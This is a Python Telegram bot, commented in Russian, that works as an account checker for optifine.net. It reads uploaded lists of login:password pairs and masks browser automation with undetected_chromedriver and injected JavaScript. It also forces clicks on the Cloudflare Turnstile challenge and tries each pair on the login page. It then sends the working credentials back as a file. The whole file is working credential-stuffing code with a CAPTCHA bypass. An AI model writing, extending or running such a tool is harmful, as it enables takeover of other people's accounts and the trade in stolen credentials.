import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
import tempfile
from datetime import datetime
from typing import Dict, List, Tuple

# Используем undetected_chromedriver для обхода Cloudflare
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Создаем директорию для отладки
os.makedirs('/app/debug', exist_ok=True)

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с гарантированным нажатием на галочку Turnstile"""
    
    def __init__(self):
        self.driver = None
        logger.info("🚀 Инициализация OptifineChecker...")
        self.init_driver()
    
    def init_driver(self):
        """Инициализация undetected-chromedriver"""
        try:
            logger.info("🔍 Определяю версию Chrome...")
            
            # Получаем версию Chrome
            try:
                chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
            except:
                chrome_version = 145
                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
            
            # Создаем временную директорию для профиля
            user_data_dir = tempfile.mkdtemp()
            
            # Настройки Chrome
            options = uc.ChromeOptions()
            
            # Основные настройки
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            
            # Отключаем признаки автоматизации
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            
            # Языковые настройки
            options.add_argument('--lang=en-US,en;q=0.9')
            
            # Реальный User-Agent
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
            
            # Отключаем логи
            options.add_argument('--disable-logging')
            options.add_argument('--log-level=3')
            options.add_argument('--silent')
            
            # Игнорируем ошибки SSL
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            
            # Важно для стабильности
            options.add_argument('--remote-debugging-port=9222')
            
            # Используем реальный профиль
            options.add_argument(f'--user-data-dir={user_data_dir}')
            options.add_argument('--profile-directory=Default')
            
            # Устанавливаем DISPLAY для Xvfb
            os.environ['DISPLAY'] = ':99'
            
            logger.info(f"🚀 Запускаю undetected_chromedriver...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=int(chrome_version),
                headless=True
            )
            
            # Устанавливаем таймауты
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(20)
            
            # Маскировка через JavaScript
            self.driver.execute_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                window.chrome = {runtime: {}};
            """)
            
            logger.info("✅ Драйвер успешно инициализирован")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            return False
    
    def human_like_delay(self, min_sec=0.5, max_sec=2):
        """Человекоподобная задержка"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def force_click_turnstile(self):
        """ГАРАНТИРОВАННОЕ нажатие на галочку Turnstile всеми возможными способами"""
        try:
            logger.info("🔍 Принудительный поиск и клик по галочке Turnstile...")
            
            # Сохраняем скриншот перед кликом
            self.driver.save_screenshot('/app/debug/before_click.png')
            
            # СПОСОБ 1: Прямой JavaScript во всех iframe
            result = self.driver.execute_script("""
                function clickAllElements() {
                    var clicked = false;
                    
                    // Функция для клика по элементу
                    function doClick(element) {
                        if (!element) return false;
                        try {
                            // Пробуем разные методы клика
                            element.click();
                            
                            // Диспатчим событие
                            var event = new MouseEvent('click', {
                                view: window,
                                bubbles: true,
                                cancelable: true
                            });
                            element.dispatchEvent(event);
                            
                            return true;
                        } catch(e) {
                            return false;
                        }
                    }
                    
                    // Селекторы для поиска галочки
                    var selectors = [
                        'input[type="checkbox"]',
                        '[role="checkbox"]',
                        '.cf-turnstile-checkbox',
                        '[class*="checkbox"]',
                        'label[class*="checkbox"]',
                        '[aria-label*="checkbox"]',
                        '.chakra-checkbox__input',
                        '.checkbox',
                        'div[class*="checkbox"]',
                        'span[class*="checkbox"]'
                    ];
                    
                    // Ищем в основном документе
                    for (var selector of selectors) {
                        var elements = document.querySelectorAll(selector);
                        for (var el of elements) {
                            if (doClick(el)) {
                                console.log('Clicked in main document:', selector);
                                clicked = true;
                            }
                        }
                    }
                    
                    // Ищем во всех iframe
                    var iframes = document.querySelectorAll('iframe');
                    for (var i = 0; i < iframes.length; i++) {
                        try {
                            var iframe = iframes[i];
                            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                            
                            if (iframeDoc) {
                                for (var selector of selectors) {
                                    var elements = iframeDoc.querySelectorAll(selector);
                                    for (var el of elements) {
                                        if (doClick(el)) {
                                            console.log('Clicked in iframe ' + i + ':', selector);
                                            clicked = true;
                                        }
                                    }
                                }
                            }
                        } catch(e) {
                            console.log('Error accessing iframe ' + i + ':', e);
                        }
                    }
                    
                    return clicked;
                }
                
                return clickAllElements();
            """)
            
            if result:
                logger.info("✅ СПОСОБ 1: Успешный клик через JavaScript")
                self.human_like_delay(3, 5)
                return True
            
            # СПОСОБ 2: Переключение в каждый iframe и прямой клик
            logger.info("🔄 Способ 1 не сработал, пробую способ 2...")
            
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            logger.info(f"📦 Найдено iframe: {len(iframes)}")
            
            for i, iframe in enumerate(iframes):
                try:
                    src = iframe.get_attribute('src') or ''
                    
                    # Проверяем, это Turnstile?
                    if 'challenges.cloudflare.com' in src or 'turnstile' in src:
                        logger.info(f"🎯 Найден Turnstile iframe #{i}")
                        
                        # Переключаемся в iframe
                        self.driver.switch_to.frame(iframe)
                        logger.info(f"📦 Переключился в iframe #{i}")
                        
                        # Ищем чекбокс
                        checkbox_selectors = [
                            "input[type='checkbox']",
                            "[role='checkbox']",
                            ".cf-turnstile-checkbox",
                            "[class*='checkbox']",
                            "label",
                            "div[role='checkbox']"
                        ]
                        
                        for selector in checkbox_selectors:
                            elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                            for element in elements:
                                if element.is_displayed():
                                    logger.info(f"✅ Нашел элемент: {selector}")
                                    
                                    # Пробуем кликнуть
                                    try:
                                        element.click()
                                        logger.info("🖱️ Клик через click()")
                                    except:
                                        try:
                                            self.driver.execute_script("arguments[0].click();", element)
                                            logger.info("🖱️ Клик через JavaScript")
                                        except:
                                            try:
                                                actions = ActionChains(self.driver)
                                                actions.move_to_element(element).click().perform()
                                                logger.info("🖱️ Клик через ActionChains")
                                            except:
                                                pass
                                    
                                    self.human_like_delay(2, 4)
                        
                        # Возвращаемся из iframe
                        self.driver.switch_to.default_content()
                        
                except Exception as e:
                    logger.error(f"❌ Ошибка с iframe {i}: {e}")
                    self.driver.switch_to.default_content()
            
            # СПОСОБ 3: Клик по координатам
            logger.info("🔄 Пробую способ 3 - клик по координатам...")
            
            for iframe in iframes:
                try:
                    src = iframe.get_attribute('src') or ''
                    if 'challenges.cloudflare.com' in src or 'turnstile' in src:
                        location = iframe.location
                        size = iframe.size
                        
                        # Кликаем в центр iframe
                        x = location['x'] + size['width'] // 2
                        y = location['y'] + size['height'] // 2
                        
                        logger.info(f"📍 Клик по координатам: {x}, {y}")
                        
                        # Клик через JavaScript
                        self.driver.execute_script(f"""
                            var element = document.elementFromPoint({x}, {y});
                            if (element) {{
                                element.click();
                                var event = new MouseEvent('click', {{
                                    view: window,
                                    bubbles: true,
                                    cancelable: true,
                                    clientX: {x},
                                    clientY: {y}
                                }});
                                element.dispatchEvent(event);
                            }}
                        """)
                        
                        logger.info("✅ Клик по координатам выполнен")
                        self.human_like_delay(2, 4)
                        
                except Exception as e:
                    logger.error(f"❌ Ошибка при клике по координатам: {e}")
            
            # СПОСОБ 4: Отправка Enter на iframe
            logger.info("🔄 Пробую способ 4 - отправка Enter...")
            
            for iframe in iframes:
                try:
                    src = iframe.get_attribute('src') or ''
                    if 'challenges.cloudflare.com' in src or 'turnstile' in src:
                        self.driver.execute_script("""
                            var iframe = arguments[0];
                            try {
                                var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                                var inputs = iframeDoc.querySelectorAll('input, button, [role="checkbox"], [role="button"]');
                                for (var input of inputs) {
                                    if (input.type !== 'hidden') {
                                        var event = new KeyboardEvent('keydown', {
                                            key: 'Enter',
                                            code: 'Enter',
                                            keyCode: 13,
                                            which: 13,
                                            bubbles: true
                                        });
                                        input.dispatchEvent(event);
                                    }
                                }
                            } catch(e) {}
                        """, iframe)
                        logger.info("✅ Enter отправлен")
                        self.human_like_delay(2, 4)
                except:
                    pass
            
            # Сохраняем скриншот после всех попыток
            self.driver.save_screenshot('/app/debug/after_clicks.png')
            
            logger.info("✅ Все способы клика применены")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка в force_click_turnstile: {e}")
            return False
    
    def handle_cloudflare(self, timeout=180):
        """Обработка Cloudflare с гарантированным нажатием на галочку"""
        logger.info("🛡️ Начинаю обработку Cloudflare...")
        start_time = time.time()
        
        # Ждем загрузки
        time.sleep(5)
        
        # Сколько раз пробовали кликнуть
        click_attempts = 0
        
        while time.time() - start_time < timeout:
            try:
                current_url = self.driver.current_url
                page_title = self.driver.title.lower()
                
                # Проверяем успех
                if 'login' in current_url and 'just a moment' not in page_title:
                    inputs = self.driver.find_elements(By.TAG_NAME, "input")
                    if len(inputs) > 0:
                        logger.info("✅ Cloudflare пройден!")
                        return True
                
                # Каждые 10 секунд пробуем кликнуть
                elapsed = int(time.time() - start_time)
                if elapsed % 10 == 0 and click_attempts < 5:
                    logger.info(f"🔄 Попытка клика #{click_attempts + 1}...")
                    if self.force_click_turnstile():
                        click_attempts += 1
                
                # Если долго висим - обновляем страницу (макс 2 раза)
                if elapsed > 60 and elapsed < 150 and elapsed % 60 < 2:
                    logger.info("🔄 Обновляю страницу")
                    self.driver.refresh()
                    time.sleep(5)
                    click_attempts = 0
                
                # Логирование
                if elapsed % 20 == 0:
                    logger.info(f"⏳ {elapsed}/{timeout} сек - попыток клика: {click_attempts}")
                
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"❌ Ошибка: {e}")
                time.sleep(2)
        
        # Финальный скриншот
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.driver.save_screenshot(f"/app/debug/cloudflare_failed_{timestamp}.png")
            with open(f"/app/debug/cloudflare_failed_{timestamp}.html", 'w', encoding='utf-8') as f:
                f.write(self.driver.page_source)
            logger.info(f"📸 Сохранен финальный скриншот: {timestamp}")
        except:
            pass
        
        logger.warning("⚠️ Cloudflare не пройден")
        return False
    
    def ensure_login_page(self):
        """Подготовка страницы входа"""
        if not self.driver:
            if not self.init_driver():
                return False
        
        try:
            logger.info("🌐 Перехожу на страницу входа...")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(5, 8)
            
            # Проходим Cloudflare
            if not self.handle_cloudflare(timeout=180):
                logger.info("🔄 Первая попытка не удалась, пробую снова...")
                self.driver.delete_all_cookies()
                self.driver.refresh()
                self.human_like_delay(5, 8)
                
                if not self.handle_cloudflare(timeout=120):
                    logger.error("❌ Не удалось пройти Cloudflare")
                    return False
            
            self.human_like_delay(3, 5)
            logger.info("✅ Готов к проверке")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        if not self.driver:
            return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
        
        try:
            # Поиск поля логина
            email_field = None
            email_selectors = [
                "//input[@name='username']",
                "//input[@name='email']",
                "//input[@type='text']",
                "//input[@type='email']",
                "//input[@placeholder='Username']",
                "//input[@placeholder='Email']"
            ]
            
            for selector in email_selectors:
                elements = self.driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed():
                        email_field = element
                        logger.info(f"✅ Найдено поле логина")
                        break
                if email_field:
                    break
            
            if not email_field:
                return {'login': login, 'status': 'error', 'error': 'Поле логина не найдено'}
            
            # Поиск поля пароля
            password_field = None
            password_selectors = [
                "//input[@type='password']",
                "//input[@name='password']",
                "//input[@name='pass']"
            ]
            
            for selector in password_selectors:
                elements = self.driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed():
                        password_field = element
                        logger.info(f"✅ Найдено поле пароля")
                        break
                if password_field:
                    break
            
            if not password_field:
                return {'login': login, 'status': 'error', 'error': 'Поле пароля не найдено'}
            
            # Поиск кнопки входа
            submit_button = None
            submit_selectors = [
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//button[contains(text(), 'Login')]",
                "//button[contains(text(), 'Sign in')]"
            ]
            
            for selector in submit_selectors:
                elements = self.driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed() and element.is_enabled():
                        submit_button = element
                        logger.info(f"✅ Найдена кнопка входа")
                        break
                if submit_button:
                    break
            
            if not submit_button:
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            # Очищаем поля
            try:
                email_field.clear()
            except:
                pass
            try:
                password_field.clear()
            except:
                pass
            
            # Вводим логин
            logger.info(f"✍️ Ввожу логин...")
            for char in login:
                email_field.send_keys(char)
                time.sleep(random.uniform(0.03, 0.07))
            
            self.human_like_delay(0.5, 1)
            
            # Вводим пароль
            logger.info(f"✍️ Ввожу пароль...")
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.03, 0.07))
            
            self.human_like_delay(0.5, 1)
            
            # Нажимаем кнопку
            logger.info("🖱️ Нажимаю кнопку входа")
            try:
                submit_button.click()
            except:
                self.driver.execute_script("arguments[0].click();", submit_button)
            
            # Ждем результат
            self.human_like_delay(5, 8)
            
            # Анализируем результат
            current_url = self.driver.current_url
            
            if 'downloads' in current_url or 'profile' in current_url:
                logger.info(f"✅ РАБОЧИЙ АККАУНТ: {login[:20]}")
                return {
                    'login': login,
                    'password': password,
                    'status': 'valid'
                }
            else:
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неверный логин/пароль'
                }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке: {e}")
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
    
    def close(self):
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# Создаем экземпляр
checker = OptifineChecker()

# --- Telegram handlers ---

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    try:
        files = os.listdir('/app/debug')
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        sent = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            with open(file_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=file,
                    caption=f"📁 **Debug:** `{file}`"
                )
            sent += 1
            await asyncio.sleep(1)
        
        await update.message.reply_text(f"✅ Отправлено файлов: {sent}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    results = {'valid': [], 'invalid': [], 'errors': []}
    
    msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
    
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            content = await f.read()
        
        accounts = []
        for line in content.strip().split('\n'):
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append((login.strip(), password.strip()))
        
        total = len(accounts)
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов**")
            return
        
        await msg.edit_text(f"📊 Аккаунтов: {total}\n🛡️ Прохожу Cloudflare...")
        
        if not checker.ensure_login_page():
            await msg.edit_text("❌ **Cloudflare не пройден**\nИспользуй /debug")
            return
        
        await msg.edit_text(f"✅ Cloudflare пройден\n📊 Проверяю {total} аккаунтов...")
        
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            if i % 5 == 0:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 Прогресс: {i}/{total}\n"
                    f"✅ Рабочих: {len(results['valid'])}\n"
                    f"⏱ Время: {elapsed:.0f}с"
                )
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        # Отправка результатов
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(f, filename=valid_file)
            os.remove(valid_file)
        
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ГОТОВО!**\n\n"
            f"📊 Всего: {total}\n"
            f"✅ Рабочих: {len(results['valid'])}\n"
            f"❌ Нерабочих: {len(results['invalid'])}\n"
            f"⏱ Время: {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Checker**\n\n"
        f"📥 Отправь .txt файл с логинами:паролями\n"
        f"🔧 Для админов: /debug",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **ПОМОЩЬ**\n\n"
            "1. Создай .txt файл\n"
            "2. В каждой строке: логин:пароль\n"
            "3. Отправь файл боту"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    try:
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        if checker:
            checker.close()

if __name__ == '__main__':
    main()